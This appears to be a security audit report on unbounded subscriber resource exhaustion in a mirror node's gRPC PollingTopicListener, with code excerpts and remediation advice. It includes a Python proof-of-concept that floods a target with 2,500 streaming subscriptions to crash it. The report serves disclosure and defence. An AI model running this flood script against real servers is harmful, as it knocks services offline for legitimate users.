# Audit Report

## Title
Unbounded Subscriber Resource Exhaustion in `PollingTopicListener.listen()` via Missing Global Subscriber Cap

## Summary
`PollingTopicListener.listen()` allocates a new `PollingContext` object and a perpetual `RepeatSpec.times(Long.MAX_VALUE)` polling loop for every subscriber, with no check against any maximum subscriber count. The only server-side guard — `maxConcurrentCallsPerConnection = 5` — limits calls per TCP connection, not total connections. An unprivileged attacker opening many connections can accumulate thousands of active polling subscriptions, each consuming heap, scheduler task slots, and a database query every 500 ms, collectively exhausting JVM heap and crashing mirror nodes.

## Finding Description

**Exact code path — `PollingTopicListener.listen()` (lines 34–49):**

Every call to `listen()` unconditionally allocates a new `PollingContext` and schedules an infinite polling loop: [1](#0-0) 

There is no guard before or inside this method that checks a subscriber count or rejects new subscriptions.

**Root cause — `subscriberCount` is observability-only:**

`TopicMessageServiceImpl` tracks `subscriberCount` as an `AtomicLong`, but it is registered exclusively as a Micrometer `Gauge` metric and is never compared against any maximum to reject new subscriptions: [2](#0-1) [3](#0-2) 

**Why the existing guard is insufficient:**

`GrpcConfiguration` applies `maxConcurrentCallsPerConnection` (default `5`) but configures no `maxConnections`: [4](#0-3) [5](#0-4) 

An attacker opens N TCP connections × 5 calls = 5N simultaneous subscriptions with no server-side ceiling.

**`ListenerProperties` has no subscriber cap field:** [6](#0-5) 

**`PollingTopicListener` is a cold publisher — every subscriber gets its own independent polling loop.** This is architecturally distinct from `SharedPollingTopicListener` and `RedisTopicListener`, both of which call `.share()` to multiplex all subscribers onto a single upstream flux: [7](#0-6) [8](#0-7) 

**Per-subscription resource cost (POLL mode):**
- One `PollingContext` instance (heap: `AtomicLong` + `AtomicReference` + `TopicMessageFilter`)
- One perpetual `RepeatSpec.times(Long.MAX_VALUE)` task chain on the shared `boundedElastic()` scheduler
- One `topicMessageRepository.findByFilter()` database query fired every 500 ms [9](#0-8) 

## Impact Explanation

With thousands of active subscriptions:

1. **Heap exhaustion** — accumulated `PollingContext` objects and queued Reactor task chains fill JVM heap.
2. **Scheduler saturation** — `Schedulers.boundedElastic()` caps threads at `10 × CPU cores` but queues tasks unboundedly; the task queue itself consumes heap.
3. **Database connection pool exhaustion** — each subscription fires a query every 500 ms; with a shared pool, legitimate queries are starved.
4. **OOM crash** — once heap is exhausted, the JVM throws `OutOfMemoryError`, crashing the mirror node process.

## Likelihood Explanation

- **No authentication required**: The gRPC `subscribeTopic` endpoint is public.
- **No rate limiting on the gRPC service**: Unlike the web3 module (which uses Bucket4j), the gRPC module has no request-rate or connection-rate limiter.
- **Low attacker capability**: Opening thousands of TCP connections and issuing gRPC streaming calls requires only a standard gRPC client library and any topic ID (or none, if `checkTopicExists=false`).
- **Repeatable**: The attack can be re-launched after a node restart with no state to clear.
- **Condition**: The listener type must be configured as `POLL` (`hiero.mirror.grpc.listener.type=POLL`). The default is `REDIS` (confirmed at `ListenerProperties.java` line 37), which uses a shared flux and is not vulnerable to per-subscriber resource multiplication. However, `POLL` is a documented, supported configuration option. [10](#0-9) 

## Recommendation

1. **Add a global subscriber cap in `TopicMessageServiceImpl.subscribeTopic()`**: Before incrementing `subscriberCount`, compare it against a configurable maximum and return an error if exceeded.
2. **Add `maxSubscribers` to `ListenerProperties`** (or `GrpcProperties`) with a sensible default (e.g., 200).
3. **Configure `maxConnections` on the Netty server** in `GrpcConfiguration` to bound the total number of TCP connections independently.
4. **Consider replacing `PollingTopicListener` with `SharedPollingTopicListener`** for all use cases, eliminating the per-subscriber polling loop entirely.

## Proof of Concept

```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# consensus_service_pb2 / _grpc generated from proto
import consensus_service_pb2 as cs
import consensus_service_pb2_grpc as cs_grpc

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = cs.TopicID(topicNum=1)
NUM_CONNECTIONS = 500   # 500 connections × 5 calls = 2500 subscriptions

def flood(i):
    channel = grpc.insecure_channel(TARGET)
    stub = cs_grpc.ConsensusServiceStub(channel)
    req = cs.ConsensusTopicQuery(topicID=TOPIC_ID)
    # Each call starts an independent PollingContext + 500ms DB query loop
    for _ in range(5):
        threading.Thread(
            target=lambda: list(stub.subscribeTopic(req)), daemon=True
        ).start()

with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as ex:
    list(ex.map(flood, range(NUM_CONNECTIONS)))

# Result: 2500 independent PollingContext objects + 2500 DB queries/500ms
# → heap exhaustion + DB pool starvation → OOM crash
```

    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)

                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
    }

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }

    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
